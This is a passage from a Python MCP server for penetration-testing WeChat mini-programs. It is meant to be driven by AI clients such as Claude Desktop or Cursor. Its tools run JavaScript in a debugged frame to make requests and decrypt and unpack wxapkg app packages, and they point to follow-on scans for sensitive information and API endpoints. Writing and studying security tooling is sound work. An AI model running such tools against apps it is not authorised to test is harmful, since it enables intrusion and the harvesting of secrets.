        "        statusCode:res.statusCode,"
        "        header:res.header||{},"
        "        data:res.data"
        "      }))"
        "    },"
        "    fail:function(e){"
        "      resolve(JSON.stringify({ok:false,error:e.errMsg||e.toString()}))"
        "    }"
        "  })"
        "})"
        "})()"
    )
    val = await _eval_in_frame(js, timeout=20.0, await_promise=True)
    try:
        result = json.loads(val) if isinstance(val, str) else val
        return json.dumps(result, ensure_ascii=False, indent=2)
    except Exception:
        return str(val)


@mcp.tool()
async def decompile_wxapkg(wxapkg_path: str, app_id: str) -> str:
    """
    解密并解包 wxapkg 小程序包文件到 output/ 目录。
    wxapkg_path: wxapkg 文件的绝对路径
    app_id: 小程序 AppID（用于解密密钥派生）
    解包后的文件可用 scan_sensitive_info / find_api_endpoints 进行分析。
    """
    sys.path.insert(0, str(FIRST_DIR))
    try:
        from src.wxapkg import extract_wxapkg
    except ImportError as e:
        return f"[错误] 无法导入 wxapkg 模块: {e}"

    pkg_path = Path(wxapkg_path)
    if not pkg_path.exists():
        return f"[错误] 文件不存在: {wxapkg_path}"

    out_dir = OUTPUT_DIR / app_id / "decompiled"
    out_dir.mkdir(parents=True, exist_ok=True)

    try:
        files = extract_wxapkg(str(pkg_path), str(out_dir), app_id)
        js_count = sum(1 for f in files if f.endswith('.js'))
        return (
            f"✅ 解包成功\n"
            f"AppID: {app_id}\n"
            f"输出目录: {out_dir}\n"
            f"提取文件: {len(files)} 个（其中 JS 文件 {js_count} 个）\n"
            f"可使用 scan_sensitive_info 或 find_api_endpoints 进一步分析"
        )
    except Exception as e:
        return f"[错误] 解包失败: {e}"


# ── 入口 ─────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="WeChat 小程序渗透测试 MCP 服务器")
    parser.add_argument("--port", type=int, default=CDP_PORT,
                        help=f"First CDP 代理端口 (默认 {CDP_PORT})")
    parser.add_argument("--transport", choices=["stdio", "sse"], default="stdio",
                        help="MCP 传输协议 (默认 stdio，用于 Claude Desktop/Cursor 等)")
    args = parser.parse_args()

    CDP_PORT = args.port
    CDP_URL = f"ws://127.0.0.1:{CDP_PORT}"

    if args.transport == "sse":
        mcp.run(transport="sse")
    else:
        mcp.run(transport="stdio")
